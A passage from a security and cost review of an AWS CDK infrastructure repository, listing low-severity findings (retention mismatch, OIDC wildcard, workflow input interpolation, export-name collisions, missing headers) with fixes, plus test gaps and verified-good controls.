**Location** `infra/lib/resources-stack.ts:167-170`

```ts
lifecycleRules: [
  { abortIncompleteMultipartUploadAfter: Duration.days(7) },
  { noncurrentVersionExpiration: Duration.days(90) },
],
```

vs `infra/README.md` (Stacks table): *"`artifacts` bucket (versioned, private, lifecycle: abort multipart after
7 d, expire old versions **14 d dev / 90 d live**)"*.

**Impact** The 90-day retention applies to **all** environments. Dev — which per `docs/DUE-DILIGENCE-2026-08-31.md`
absorbed 13+ real Fargate runs and three real deliveries — keeps every superseded version of every deliverable
zip for a quarter. Minor cost, but the same 90-day number is what
`infra/test/security-baseline.test.ts` asserts ("versioned artifacts with 90-day noncurrent expiry"), so the test
locks in the behaviour and the README describes a policy that no longer exists. In a GDPR context (customer
source code, `legal/pub-avtal.md` §10.2 talks about copy retention) an undocumented longer retention on a
non-production environment is the wrong direction of error.

**Fix** Either implement the documented split
(`noncurrentVersionExpiration: Duration.days(isLive ? 90 : 14)`) and update the test, or correct the README.
Prefer the former — it matches the stated data-retention posture.

---

## Low

### INF-23 The OIDC `sub` wildcard spans `/`, and the deploy role is effectively account-admin

**Location** `infra/lib/github-deploy-stack.ts:63-72,77-85`

```ts
StringLike: { [`${githubOidcHost}:sub`]: environments.flatMap(environment => [
  `repo:${repository}:environment:${environment}`,
  `repo:${owner}@*/${name}@*:environment:${environment}`,
]) },
```

**Impact** Two small notes on an otherwise **correct** trust policy (it does pin `aud` with `StringEquals` and
does bind `sub` to repo + environment — the audit's item 6 requirement is met). First, IAM `StringLike` `*`
matches `/` as well, so the second pattern's guarantee rests on GitHub refusing `@` in owner/repo names rather
than on the policy shape; using `repo:${owner}@?*/${name}@?*:…` narrows nothing, so the practical fix is to drop
the pattern once the immutable-subject rollout stabilises, or replace it with the specific numeric ids once known.
Second, `sts:AssumeRole` on `role/cdk-*-role-${account}-${region}` reaches the CDK **deploy** role, whose default
bootstrap grants `cloudformation:*` plus PassRole to a CloudFormation execution role holding
`AdministratorAccess`. So `mf-github-deploy` is transitively account-admin. That is inherent to CDK and correctly
documented as "thin", but the doc comment ("It cannot run `cdk bootstrap` itself") may read as a stronger bound
than it is. Consider `--cloudformation-execution-policies` scoped below `AdministratorAccess` at re-bootstrap
time, and `cdk-hnb659fds-*-role-…` instead of `cdk-*-role-…`.

### INF-24 `${{ inputs.environment }}` is interpolated directly into `run:`

**Location** `.github/workflows/deploy-environment.yml:71,75,79,83` —
`run: npx cdk deploy resources-${{ inputs.environment }} --exclusively …`

**Impact** Not currently exploitable: the only caller is `deploy.yml`, whose `workflow_dispatch` input is a
`type: choice` with `options: [dev, qa, live]`, and the three jobs pass string literals. But
`deploy-environment.yml` declares the input as `workflow_call` / `type: string` with no `pattern`, so the safety
lives entirely in the caller. Anyone adding a second caller inherits a shell-injection sink in a job that has
already assumed the admin-equivalent deploy role. No `${{ github.event.* }}` appears in any `run:` block — that
part is clean.

**Fix** Pass through `env:` (`env: { ENVIRONMENT: '${{ inputs.environment }}' }`, then `"$ENVIRONMENT"` in the
script), and validate the input in the reusable workflow's first step.

### INF-25 Unquoted word splitting in `deploy.sh`

**Location** `infra/scripts/deploy.sh:26-27` (`for a in "$@" … rest="$rest $a"` then `set -- $rest`),
`:90` (`npx cdk deploy $stacks $exclusively`).

**Impact** Intentional re-splitting, but it also glob-expands: a stack argument containing `*` or `?` is expanded
against the `infra/` directory before reaching CDK. Harmless today (stack names are fixed), and inconsistent with
the otherwise careful `set -euo pipefail` discipline.

**Fix** Use an array: `rest=(); … rest+=("$a"); set -- "${rest[@]}"` and `npx cdk deploy "${stacks[@]}"`.

### INF-26 "No account numbers in git" is not true

**Location** `infra/lib/config.ts:90` (the claim: *"No account numbers in git. …"*) vs
`infra/lib/config.ts:137,141` (`arn:aws:acm:us-east-1:814967776290:…`, `arn:aws:acm:eu-north-1:814967776290:…`),
`:185,189` (the qa `PENDING-…` ARNs, same account), `infra/scripts/deploy.sh:58` (`MF_MANAGEMENT_ACCOUNT=814967776290`).

**Impact** Account ids are not secrets, and `deploy.sh:57` *needs* the literal for the wrong-account guard to
work. The problem is only that a reader trusting the comment will not go looking — and the id it exposes is the
**organisation management account**, which `docs/DUE-DILIGENCE-2026-08-31.md` names as the platform's largest
open exposure ("the platform still lives in the org management account").

**Fix** Correct the comment to say what is actually true ("no credentials in git; the management account id is
committed deliberately for the deploy guard").

### INF-27 CloudFormation export names are not environment-scoped

**Location** `infra/lib/resources-stack.ts:554-595` — `exportName: 'vpc-id'`, `'rds-endpoint'`,
`'rds-secret-arn'`, `'s3-artifacts'`, … ; `infra/lib/web-stack.ts:355-362` — `'site-url'`, `'portal-url'`, `'api-url'`.
The comment reads *"export names never contain the environment — one account per environment"*.

**Impact** All three environments read the same `MF_ACCOUNT || CDK_DEFAULT_ACCOUNT` (`infra/lib/config.ts:96`),
(`infra/lib/config.ts:102`), so the "one account per environment" premise is a deployment convention, not
something the code enforces.
Deploying two environments into one account fails at export-name collision — which is a *safe* failure, but an
opaque one (`Export with name vpc-id is already exported by stack resources-dev`) that will land in the middle of
the Phoenix account migration. The `MF_ENV` gate in `infra/bin/app.ts:32` prevents synthesising two at once, but
CI's ungated synth builds all three with identical export names.

**Fix** Suffix the exports (`vpc-id-${environment.name}`) at the next opportunity where changing an export is
cheap — note that changing an export name while an importing stack exists requires a two-phase deploy.

### INF-28 The `/bff/*` CloudFront behaviour has no response-headers policy

**Location** `infra/lib/web-stack.ts:328-333` — `distribution.addBehavior('/bff/*', apiOrigin, { … })` with no
`responseHeadersPolicy`. Synth: `behavior path=/bff/* … rhp=N` vs `behavior path=default … rhp=Y`.

**Impact** API responses reach the browser without `Strict-Transport-Security`, `X-Content-Type-Options` or the
CSP applied to the SPA. Low severity for JSON responses, but HSTS specifically matters here: the api hostname is
a separate origin (`api.<env>.mjukvaruhuset.se`), and it never sends the header from either path.

**Fix** Pass `responseHeadersPolicy` to the `/bff/*` behaviour too (or a slimmer policy with just HSTS +
nosniff), and consider setting the headers in the Fastify app so direct-to-ALB requests get them as well.

### INF-29 `cloudfront:CreateInvalidation` on `Resource: "*"` in the BucketDeployment role

**Location** CDK-generated from `infra/lib/web-stack.ts:118-123` (`new BucketDeployment(... distribution,
distributionPaths: ['/*'] )`). Synth: `Action=["cloudfront:GetInvalidation","cloudfront:CreateInvalidation"]
Resource="*" Cond=NONE`.

**Impact** A CDK framework limitation (the construct does not scope the distribution ARN). The lambda can
invalidate any distribution in the account — a cost/availability nuisance at worst, not an escalation. Recorded
so it is not re-discovered as novel.

**Fix** None practical; suppress with a documented note in `infra/test/security-baseline.test.ts` if you add a
"no unconditioned `Resource: *`" assertion (recommended — see Infra test gaps).

### INF-30 ALB has deletion protection off in live and no `drop_invalid_header_fields`

**Location** `infra/lib/web-stack.ts:148-192`. Synth (`mf-live`):
`attrs=[{"Key": "deletion_protection.enabled", "Value": "false"}]`.

**Impact** The live ALB — whose DNS name is the Route 53 target and, without a domain, the api URL itself — can
be deleted by any principal with `elasticloadbalancing:DeleteLoadBalancer`, including an accidental
`cdk destroy mf-live`. `drop_invalid_header_fields` off leaves request-smuggling-adjacent header handling at the
permissive default in front of a Node HTTP server.

**Fix** `api.loadBalancer.setAttribute('deletion_protection.enabled', String(isLive))` and
`setAttribute('routing.http.drop_invalid_header_fields.enabled', 'true')`.

### INF-31 Hardcoded OIDC thumbprints; ECR lifecycle only expires untagged images

**Location** `infra/lib/github-deploy-stack.ts:52-56` (`thumbprintList: ['6938fd…','1c58a3…']`) and
`infra/lib/resources-stack.ts:337` (`lifecycleRules: [{ tagStatus: TagStatus.UNTAGGED, maxImageAge: Duration.days(14) }]`).

**Impact** The thumbprints are correctly documented as informational (AWS validates against its trusted CA store
for `token.actions.githubusercontent.com`) — no action needed, recorded for completeness. The ECR rule is a real
if slow leak: per-delivery **tagged** images are never expired ("kept until the preview is torn down
out-of-band"), so the repository grows by one full api image per delivery forever, and there is no teardown
automation yet (`docs/backlog/teardown-deprovisioning.md`).

**Fix** Add a second rule: `{ tagStatus: TagStatus.ANY, maxImageCount: 100 }` as a backstop, or
`tagPatternList` + `maxImageAge` once preview lifetimes are decided.

---

## Cost observations

- **VPC endpoints are the single best cost *and* security win available.** An S3 **gateway** endpoint is free
  and would remove all artifact upload/download bytes (repo zips, deliverable bundles, CodeBuild source) from
  the NAT gateway's per-GB processing charge. Interface endpoints for Secrets Manager, ECR and CloudWatch Logs
  (~7 USD/month each) pay for themselves at any real job volume and are the same building block the planned
  hard egress fence needs (`TODO-EXTERNAL.md`). Today every one of those hosts is in `jobNoProxyHosts`
  (`infra/lib/resources-stack.ts:424-437`) and therefore goes out through NAT.
- **`qa` is a full-price clone of `dev`.** Same `db.t4g.micro`, same 1 NAT gateway, same always-on ALB, same
  Fargate api task: ≈ 85 USD/month idle for a rehearsal environment, on top of dev's. Options: run qa on a
  schedule (stop the api service and the RDS instance out of hours), or drop qa's NAT gateway and give the job
  subnets VPC endpoints only.
- **CloudFront has no `priceClass`** (`infra/lib/web-stack.ts:98`), so both distributions default to
  `PriceClass_All` — every edge location worldwide for a Sweden-first product. `PriceClass_100` (NA + EU) is the
  obvious setting and materially cheaper per GB.
- **Unbounded ECR growth** — see INF-31. One api image per delivery, kept forever.
- **The artifacts bucket keeps noncurrent versions for 90 days in dev too** — see INF-22.
- **`multiAz: false` in live** (`infra/lib/resources-stack.ts:151`) is a deliberate, documented cost choice
  (README: "Multi-AZ is off in both for now"). Worth restating as the explicit availability trade it is: a
  single-AZ Postgres with a 30-day backup retention means an AZ failure is a restore-from-backup event with
  hours of RTO, not a failover. Fine pre-revenue; revisit before the first paid pilot.
- **The `Environment` cost-allocation tag is still unactivated** ([known], `TODO-EXTERNAL.md`), so the
  `budget-<env>` stack's `costFilters` (`infra/lib/budget-stack.ts:35`) currently match 0 USD and every budget
  alarm is silent. This is the one item on that list that costs nothing and blocks all three budgets — worth
  pulling forward.
- **Secrets Manager**: 7 secrets × 3 environments × 0.40 USD ≈ 8.40 USD/month once qa and live exist. Small, but
  note two of the seven (`sentry-dsn`, `github-oauth-client-secret`) hold non-secret or absent values today.

---

## Infra test gaps

`infra/test/` is genuinely good for a project this age — 5 suites, 28 assertions, and `security-baseline.test.ts`
pins the things that matter most (no plaintext secrets in task definitions, the job role's exact grant set, the
`jobArtifactsRole` prefix scoping, the `PutMetricData` namespace fence, CloudFront security headers, backups,
log retention). The gaps below are all "the test that would have caught a finding above":

1. **No test asserts the live/dev security *delta*** — nothing fails when `live` synthesises an HTTP-only
   listener (INF-02). Add a `live-environment.test.ts` mirroring `qa-environment.test.ts` that asserts
   `mf-live` has an `AWS::ElasticLoadBalancingV2::Listener` with `Protocol: HTTPS`, that every CloudFront origin
   has `OriginProtocolPolicy: https-only`, and that `RemovalPolicy` is `Retain`/`Snapshot` on every stateful
   resource. This is the highest-value missing test in the repo.
2. **No global "no unconditioned `Resource: "*"`" assertion.** A template-wide sweep that allows an explicit
   allowlist (`ecr:GetAuthorizationToken`, the CDK BucketDeployment invalidation) and fails on anything new
   would have caught INF-03 at review time.
3. **No test for the `iam:PassRole` set.** `security-baseline.test.ts` checks the job role's *actions* but not
   which roles it may pass — INF-05 passes the current suite.
4. **No test that the CodeBuild service role's S3 read is prefix-scoped** — INF-01's duplicate unscoped
   `grantRead` is invisible to the existing "no direct S3" assertion, which only inspects the *job* role.
5. **Dockerfiles are untested.** A three-line assertion that every Dockerfile ends with a non-root `USER`
   (INF-06) and that `.dockerignore` contains `.env` (INF-11) costs nothing and is easy to keep honest.
6. **The proxy allowlist is untested.** No test asserts `FilterDefaultDeny Yes`, `ConnectPort 443`, or that the
   `filter` file contains no `*` wildcard — all three are load-bearing security properties in a file that reads
   like configuration and will be edited casually.
7. **`deploy.sh`'s three wrong-account guards have no test**, while `ensure-bootstrapped.sh` has three. The
   guards are the mitigation for the audit's worst finding (A1); INF-17 shows one of them is bypassable. A
   bats/vitest harness stubbing `aws` would cover all three paths.
8. **No drift test for the RDS secret's removal policy** (INF-07) — `security-baseline.test.ts` asserts backup
   retention but not `DeletionPolicy` on the secret that unlocks the snapshot.

---

## Verified-good

Confirmed against the synthesised templates, not just the source — these are load-bearing and correct:

- **`iam:PassRole` is condition-scoped everywhere it appears.** `PassExpressRoles` carries
  `iam:PassedToService: ['ecs-tasks.amazonaws.com','ecs.amazonaws.com']` and `PassCodeBuildRole` carries
  `codebuild.amazonaws.com` (`infra/lib/resources-stack.ts:531-550`). No bare `iam:PassRole` on `*` anywhere in
  either template. (INF-05 is about the grant being unnecessary, not unconditioned.)
- **`cloudwatch:PutMetricData` is namespace-fenced** — `Resource: "*"` is unavoidable for this action, and the
  `StringEquals: {'cloudwatch:namespace': 'mf/<env>'}` condition is the strongest fence CloudWatch offers
  (`infra/lib/web-stack.ts:295-301`). The reasoning in the comment is accurate.
- **The job task role holds no database credential and no direct S3 permission.** Verified: no `5432` rule
  referencing `JobSecurityGroup`, no `DATABASE_*` in the job container definition, no `s3:*` on the task role.
  The M3-REVIEW #18 claim holds.
- **Every security-group rule that references another security group does so by SG id, not CIDR.** Synth shows
  `SourceSecurityGroupId` on both the ALB→task rule and the api→Postgres rule
  (`infra/lib/web-stack.ts:266-270`); the only `0.0.0.0/0` entries are the public ALB's ingress (correct for an
  internet-facing service) and egress rules.
- **RDS in `live`**: `StorageEncrypted: true`, `PubliclyAccessible: false`, `DeletionProtection: true`,
  `BackupRetentionPeriod: 30`, `DeletionPolicy: Snapshot`, `UpdateReplacePolicy: Snapshot`, placed in
  `PRIVATE_ISOLATED` subnets with a dedicated SG that has `allowAllOutbound: false`. This is the right shape.
- **The artifacts bucket** is `BlockPublicAccess.BLOCK_ALL`, `S3_MANAGED` encryption, `enforceSSL` (synth
  confirms the `aws:SecureTransport` deny in the bucket policy), versioned, with abort-multipart and
  noncurrent-expiry lifecycle rules, `RemovalPolicy.RETAIN` + `autoDeleteObjects: false` in live.
- **SPA origins use CloudFront OAC**, not a public bucket or legacy OAI (`S3BucketOrigin.withOriginAccessControl`,
  `infra/lib/web-stack.ts:101`), with `BLOCK_ALL` on the bucket.
- **The CloudFront response-headers policy is a real one**: HSTS 365 d + `includeSubdomains`, CSP with
  `frame-ancestors 'none'` and `object-src 'none'`, `X-Frame-Options: DENY`, nosniff, strict referrer policy
  (`infra/lib/web-stack.ts:66-87`), applied to the default behaviour of both distributions.
- **The GitHub OIDC trust policy meets the bar**: `StringEquals` on `…:aud = sts.amazonaws.com` **and**
  `StringLike` on `…:sub` restricted to `repo:<owner>/<name>:environment:<env>` — no branch subject, no fork
  subject, no `repo:*`. `github-deploy-stack.test.ts` asserts exactly this.
- **`ensure-bootstrapped.sh` fails closed.** It bootstraps *only* on the literal "does not exist" string and
  exits 1 with the CLI's message on any other error — the correct choice, and it has three tests.
- **`deploy.sh`'s wrong-account guards** are a thoughtful three-layer design (require an explicit `MF_ACCOUNT`
  for qa/live before touching ambient creds; refuse the management account for non-dev; refuse a mismatch
  between `MF_ACCOUNT` and the resolved account). INF-17 is a bug *in* that design, not a criticism of it.
- **`apps/job/Dockerfile`'s sandbox** is the strongest thing in this review: two uids, a capability bounding set
  trimmed to `setuid,setgid,kill`, `--no-new-privs` on every child, a private 700 HOME per uid, a setgid shared
  `/work`, and `--ignore-scripts` on both installs. The reasoning is written down and matches what the file does.
- **No `pull_request_target` anywhere**, and no `${{ github.event.* }}` interpolated into any `run:` block.
- **`trivy-action` is SHA-pinned with the hijack incident documented inline** — the right instinct, applied to
  the right action (INF-16 is only that it was not applied to the others).
- **`circuitBreaker: { rollback: true }` and `desiredCount: 2` in live** on the api service, with a `/health`
  target-group health check — deployment safety that is often missing at this stage.
- **The M3 hardening #2 metric design is genuinely sound**: alarms read custom metrics the api publishes from
  its own Zod-validated ingestion, not from log lines a customer build can also emit. The `ops-stack.test.ts`
  assertion names this explicitly.
